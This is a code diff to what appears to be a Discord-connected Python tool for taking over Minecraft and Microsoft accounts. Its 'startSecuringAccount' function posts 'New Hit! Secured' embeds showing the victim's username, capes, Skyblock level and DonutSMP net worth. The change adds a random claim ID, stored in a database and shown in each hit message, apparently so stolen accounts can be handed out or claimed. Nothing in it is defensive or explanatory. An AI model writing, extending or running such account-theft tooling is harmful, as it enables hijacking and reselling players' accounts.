@@ -6,10 +6,12 @@ from views.utils.minecraft.simplify import simplify
 from views.utils.initialSession import getSession
 from views.utils.securing.secure import secure
 from views.utils.getMSAAUTH import getMSAAUTH
+from database.database import DBConnection
 from urllib.parse import quote
 from discord import Embed
 import httpx
 import time
+import uuid
 
 async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
     # Handles the data to be displayed in embeds to discord
@@ -78,12 +80,18 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["slevel"])}', inline=True)
     stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)
 
+    # Generate a unique claim ID for this secured account
+    claim_id = uuid.uuid4().hex[:8]
+    with DBConnection() as database:
+        database.addPendingClaim(claim_id)
+
     # Account Embed
     hit_embed = Embed(
         title = f"New Hit! Secured in {round(finalTime, 2)}s",
         description = f"[Login](https://login.live.com/) | [Donut](https://www.donutstats.net/player-finder) | [SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | [Plancke](https://plancke.io/hypixel/player/stats/{name}) | [Is Online](https://hypixel.paniek.de/player/{name}/status)",
         color = 0x279CF5
     )
+    hit_embed.add_field(name="Claim ID", value=f"`{claim_id}`", inline=False)
     hit_embed.add_field(name="MC Username", value=f"```{account["minecraft"]['name']}```", inline=False)
     hit_embed.add_field(name="MC Method", value=f"```{account["minecraft"]['method']}```", inline=True)
     hit_embed.add_field(name="MC Capes", value=f"```{account["minecraft"]['capes']}```", inline=True)
